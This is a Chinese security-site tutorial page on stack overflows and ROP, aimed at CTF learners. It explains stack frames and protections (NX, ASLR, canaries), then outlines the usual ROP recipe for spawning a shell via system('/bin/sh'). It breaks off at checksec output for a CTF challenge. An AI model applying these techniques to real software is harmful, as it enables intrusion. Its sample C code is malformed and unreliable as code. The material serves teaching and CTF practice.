@@ -1,0 +1,1107 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
+<head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+    <meta name="viewport"
+          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
+    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
+    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
+    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
+    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
+    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
+    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
+    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
+    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>
+
+        <title>【技术分享】现代栈溢出利用技术基础：ROP - 安全客 - 有思想的安全新媒体</title>
+    
+        <meta name="keywords" content="栈溢出,缓冲区溢出,ROP"/>
+    
+        <meta name="description" content="本文从原理到现代防御机制并结合CTF题目实例来向大家介绍现在基础栈溢出利用技术。"/>
+        <meta property="wb:webmaster" content="224437c7be31d633"/>
+
+    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
+    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
+    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
+    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
+    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
+    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
+    (max-device-width:900px), only screen and (max-width:900px)" />
+    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
+    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
+    <script type="text/javascript" src="/js/iscroll.js"></script>
+    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
+    <script type="text/javascript">
+        var myScroll, myNavScroll;
+
+        function iscrollLoaded() {
+            myScroll = new IScroll('#wrapper',
+                {
+                    scrollX: true,
+                    scrollY: false,
+                    bounceEasing: 'circular',
+                    eventPassthrough: true,
+                    preventDefault: false,
+                    bounceTime: 500
+                }
+            );
+        }
+
+        $(function () {
+
+            //导航横向滚动
+
+
+            function setNavWidth() {
+
+                /* 计算导航宽度 */
+                var allWidth = $(window).width();
+                var scroller = $('#scroller');
+
+                if (allWidth > 900) {
+                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
+                    scroller.css('overflow', 'visible');
+                    if (myNavScroll) myNavScroll.destroy();
+                } else {
+
+                    var width = 0;
+                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
+                        if (!$(this).hasClass('mobile-hide')) {
+                            width += $(this).outerWidth();
+                        }
+                    });
+                    scroller.find('ul').add(scroller.find('.scroll')).width(width);
+
+                    if (myNavScroll) myNavScroll.destroy();
+
+                    myNavScroll = new IScroll('#scroller', {
+                        scrollX: true,
+                        scrollY: false,
+                        momentum: false,
+                        click: true
+                    });
+
+                }
+
+            }
+
+            setNavWidth();
+            $(window).resize(function (event) {
+                setNavWidth();
+            });
+
+        });
+
+    </script>
+</head>
+<body onload="iscrollLoaded();">
+<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
+    <img src=""/>
+</div>
+
+<div id="is-mobile"></div>
+<div class="container">
+        <div class="mobile-header">
+        <div class="header clearfix">
+            <div class="header-wrapper clearfix">
+                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
+                                <form id="search" class="search-box" action="/search/index" method="GET">
+                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
+                    <input class="icon" type="submit" value="">
+                    <input type="hidden" name="type" value=""/>
+                </form>
+                <div class="bug">
+                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
+                    <ul class="typelist">
+                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
+                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
+                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
+                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
+                    </ul>
+                </div>
+                                <div class="logNreg mobile-hide">
+                    <div class="unlog">
+                        <i></i>
+                        <a href="log.html" class="log">登录</a>
+                        <span>|</span>
+                        <a href="reg.html" class="reg">注册</a>
+                    </div>
+                    <div class="loged">
+                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
+                        <div class="user-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
+                                                               target="_blank"><i></i><span>账号设置</span></a></li>
+                                <li class="alert-setting"><a href="/keywords/index"
+                                                             target="_blank"><i></i><span>告警设置</span></a></li>
+                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
+                                </li>
+                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
+                                </li>
+                                <li class="my-exit"><a
+                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
+                                </li>
+                            </ul>
+                        </div>
+
+                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
+                        <div class="message-links">
+                            <span class="arrow"></span>
+                            <ul>
+                                <li class="account-setting" style="display:none;"><a href="/myres/index"
+                                                                                     target="_blank"><i></i><span>回复我的</span></a>
+                                </li>
+                                <li class="my-bug"><a href="/myvul/index"
+                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
+                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
+                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
+                                </li>-->
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <style type="text/css">
+            .nav {
+                overflow: hidden;
+            }
+
+            .nav .scroll {
+                width: auto;
+            }
+        </style>
+        <div id="wrapper">
+            <div id="scroller" class="nav">
+                <div class="scroll">
+                    <ul class="nav-list">
+                        <li ><a class="link-nav"
+                                                                                 href="/index/index">首页</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/vul/index">漏洞</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/introduce/list">招聘</a>
+                        </li>
+                        <li >
+                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
+                        </ul>
+			-->
+                        </li>
+                        <li class="cur">
+                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
+                        <ul class="subnav-list mobile-hide">
+                            <li><a class="link-subnav" href="/course/index">学院</a></li>
+                        </ul>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/activity/index">活动</a></li>
+                        <li class="mobile-hide "><a class="link-nav"
+                                                                                                   href="/ctf/index">CTF训练营</a>
+                        </li>
+                        <li ><a class="link-nav"
+                                                               href="/interref/list">安全内参</a></li>
+                        <li ><a class="link-nav" href="/app/index">APP</a></li>
+
+                        <!--<li ><a href="/course/index">学院</a></li>-->
+                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
+                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="mobile-content">
+        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
+<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
+<style>
+    p .syntaxhighlighter {
+        width: 80%;
+    }
+</style>
+
+<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>
+
+<div class="content clearfix">
+    <div class="main">
+        <div class="article">
+            <div id="article_box">
+                <h2>【技术分享】现代栈溢出利用技术基础：ROP</h2>
+                <div class="article-msg">
+                    <span class="time">2017-04-05 09:33:04</span>
+                    
+                                        <span class="read">阅读：23503次</span>
+                    <span><a style="display: none;" class="good" href="javascript:;"
+                             data-target="/learning/good" data-value="g_3694"
+                             data-type="learning">点赞(0)</a></span>
+                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
+                             data-pk="3694" data-type="learning">收藏</a></span>
+                                        <span><a style="margin-left: 4px;" class="fav" href=""
+                             target="_blank">来源： 安全客</a></span>
+                    
+                    
+                    <div style="margin-top:10px; ">
+                        <a href="/member/contribute?uid=820455891" style="color:#848e99;">
+                            <img src="http://p1.qhmsg.com/dm/150_150_100/t0181f6dca2bb0e1569.jpg" data-is-avatar="true"
+                                 style="border: 1px solid #d5d5d5;padding: 2px; width: 80px;height: 80px;border-radius: 43px;"/>
+                        </a>
+
+                    </div>
+                    <span class="orig">作者：<a href="/member/contribute?uid=820455891" style="color:#848e99;">beswing</a></span>
+                                    </div>
+                <hr size="1">
+                <div class="article-msg">
+                    <p><!-- JiaThis Button BEGIN -->
+
+<!--
+<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
+	<a class="jiathis_button_weixin"></a>
+	<a class="jiathis_button_tsina"></a>
+    <a class="jiathis_button_tqq"></a>
+    <a class="jiathis_button_qzone"></a>
+    <a class="jiathis_button_renren"></a>
+    <a class="jiathis_button_xiaoyou"></a>
+    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+</span>
+
+-->
+</p>
+                </div>
+                <p><p style="text-align: center; text-indent: 0em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><img src="http://p1.qhimg.com/t019f194b135178ee10.jpg" title="t019f194b135178ee10.jpg" alt="http://p1.qhimg.com/t019f194b135178ee10.jpg"/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></strong></span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="color: rgb(0, 112, 192); font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; font-size: 18px; font-weight: 900; line-height: 25px;">作者：</span><a href="http://bobao.360.cn/member/contribute?uid=820455891" target="_self" textvalue="beswing" style="text-decoration: none;"><span style="line-height: 25px; font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">beswing</span></a></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">预估稿费：400RMB</span></p><p style="margin: 0px 25px 8px; white-space: normal; padding: 0px; line-height: 25px; color: rgb(70, 79, 85); word-break: break-all; font-family: Helvetica, &quot;Hiragino Sans GB&quot;, &quot;Microsoft Yahei&quot;, 微软雅黑, serif; text-indent: 2em; background-color: rgb(255, 255, 255);"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(0, 112, 192); font-size: 18px; font-weight: 900;">投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">栈与系统栈</span></strong></span><br/></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">栈:一种先进后出的数据结构。常见操作有两种，进栈(PUSH) 和弹栈(POP),用于标识栈的属性有两个，一个是栈顶(TOP)，一个是栈底（BASE）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">程序中的栈:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">内存中的一块区域，用栈的结构来管理，从高地址向低地址增长</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">寄存器esp代表栈顶（即最低栈地址）</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">栈操作</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">压栈（入栈）push sth-&gt; [esp]=sth,esp=esp-4</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">弹栈（出栈）pop sth-&gt; sth=[esp],esp=esp+4</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">栈用于保存函数调用信息和局部变量</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">函数调用</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">如何通过系统栈进行函数的调用和递归</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">int&nbsp;fun_b(x,y){
+int&nbsp;var_b1,var_b2;
+rutrun&nbsp;var_b1&nbsp;var_b2&nbsp;;
+}
+int&nbsp;fun_a(a,b){
+int&nbsp;var_a;
+var_a&nbsp;=&nbsp;fun_b(ab)
+}
+int&nbsp;main(int&nbsp;argc,chr&nbsp;argv,chr&nbsp;envp)
+{
+int&nbsp;var_main;
+var_main&nbsp;=&nbsp;func_a{5,5};
+rutrun&nbsp;var_main;
+}</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">函数的分布应当是:</span></p><p style="text-align: center; text-indent: 0em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;"><img src="http://p6.qhimg.com/t015878b1f33774814a.png" title="t015878b1f33774814a.png" alt="http://p6.qhimg.com/t015878b1f33774814a.png"/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">当CPU调用func_A函数，会从main函数对应的机器指令跳转到func_A，取值在执行，执行结束后，需要返回又会进行跳转.......以此类似的跳转过程。</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">函数调用指令: call ret</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">大致过程:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">参数入栈</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">返回地址入栈</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">代码区块跳转</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">栈帧调整:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">保存当前栈帧的状态值，为了后面恢复本栈帧时使用(EBP入栈)；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">将当前的栈帧切换到新栈帧(ESP值装入EBP，更新栈帧底部)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">给新栈帧分配空间(ESP减去所需要空间的大小，抬高栈顶)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">相关指令:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">Call func -&gt; push pc, jmp func</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">Leave -&gt;mov esp,ebp, pop ebp&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; color: rgb(0, 176, 80);">Ret -&gt; pop pc</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">函数约定:</span></strong></span></p><pre class="brush:plain;toolbar:false">*&nbsp;__stdcall，__cdecl，__fastcall，__thiscall，__nakedcall，__pascal</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">以 __fastcall为例子:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">push&nbsp;&nbsp;参数&nbsp;3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#参数由右向左入栈
+push&nbsp;参数&nbsp;2
+push&nbsp;参数&nbsp;1
+call&nbsp;函数地址&nbsp;&nbsp;&nbsp;&nbsp;#push当前指令位置，跳转到所调用函数的入口地址
+push&nbsp;ebp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#保存旧栈帧的底部
+mov&nbsp;ebp,esp&nbsp;&nbsp;&nbsp;&nbsp;#设置新栈帧底部
+sub&nbsp;esp&nbsp;,xxx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#设置新栈帧顶部</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">参数传参:取决于调用约定，一般情况下:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">X86 从右向左入栈，X64 优先寄存器，参数过多时才入栈</span></p><p style="text-indent: 2em; text-align: left;"><br/></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">寄存器</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">重要的寄存器：rsp/esp, pc, rbp/ebp, rax/eax, rdi, rsi, rdx, rcx</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ESP: 栈指针寄存器，内存存放着一个指针，指针指向系统栈最上面一个栈帧的底部</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">EBP:基址指针寄存器，存放着一个指针，指针指向系统栈最上面的一个栈帧底部</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01e8b20fe6caa31658.jpg" title="t011e10c089bb2fa12a.jpg" alt="http://p9.qhimg.com/t011e10c089bb2fa12a.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">堆栈溢出原理</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">通俗的讲，栈溢出的原理就是不顾堆栈中分配的局部数据块大小，向该数据快写入了过多的数据，导致数据越界，结果覆盖来看老的堆栈数据。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">栈溢出的保护机制</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">栈上的数据无法被当作指令来执行</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">数据执行保护(NX/DEP)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">绕过方法ROP</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">难以找到想要找的地址</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">地址空间布局随机化(ASLR)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">绕过方法:infoleak 、retdlresolve 、ROP</span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(0, 112, 192);"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">检测栈数据是否被修改</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Stack Canary/ Cookie</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">绕过方法: infoleak</span></p><p style="text-align:center"><img src="http://p8.qhimg.com/t01b9be9878dadebed6.png" title="t010b149dce26fdc0ad.png" alt="http://p2.qhimg.com/t010b149dce26fdc0ad.png"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">如今 计算机保护 基本上都是NX+Stack Canary +ASLR</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">CTF 常用套路: 栈溢出的利用方法</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现代栈溢出利用技术基础：ROP</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">利用signal机制的ROP技术：SROP</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">没有binary怎么办：BROP 、dump bin</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">劫持栈指针：stack pivot</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">利用动态链接绕过ASLR：ret2dl resolve、fake linkmap</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">利用地址低12bit绕过ASLR：Partial Overwrite</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">绕过stack canary：改写指针与局部变量、leak canary、overwrite canary</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">溢出位数不够怎么办：覆盖ebp，Partial Overwrite</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">现代栈溢出利用技术基础:ROP</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">讲道理学习ROP ，看蒸米的</span><a href="http://wooyun.bestwing.top:5000/search?keywords=rop&content_search_by=by_drops" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">文章</span></a><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">是最实在的。蒸米的一步一步学ROP简直是经典篇目。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ROP的基础学习可以看我翻译的一篇</span><a href="http://m.bobao.360.cn/learning/appdetail/3569.html" target="_self" style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-decoration: underline;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">文章</span></a></p><p><br/></p><p style="text-align: left; text-indent: 2em;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 32px;">ROP题目分析</span></strong></span></p><hr/><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">承接上一个篇目，这里继续讲ROP的一些题目分析。讲真的，我这里基本上的题目以及攻击方式都来自于Atum师傅在X-MAN的PPT。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">CTF中ROP的常规套路</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">第一次触发漏洞，通过ROP泄漏libc的address(如puts_got)，计算system地址，然后返回到一个可以重现触发漏洞的位置(如main)，再次触发漏洞，通过ROP调用system(“/bin/sh”)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">直接execve(“/bin/sh”, [“/bin/sh”], NULL)，通常在静态链接时比较常用</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">三个练习:</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Defcon 2015 Qualifier：R0pbaby</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">AliCTF 2016：vss</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">PlaidCTF 2013: ropasaurusrex</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">相关题目我们可以在<a href="https://github.com/ctfs/" target="_self">CTFs</a>上找到。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Defcon 2015 Qualifier：R0pbaby</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">我们拿到题目，可以先对题目进行检查，可先看看题目开启的保护</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><pre class="brush:plain;toolbar:false">gdb-peda$&nbsp;checksec
+CANARY&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled
+FORTIFY&nbsp;&nbsp;&nbsp;:&nbsp;ENABLED
+NX&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;ENABLED
+PIE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;disabled
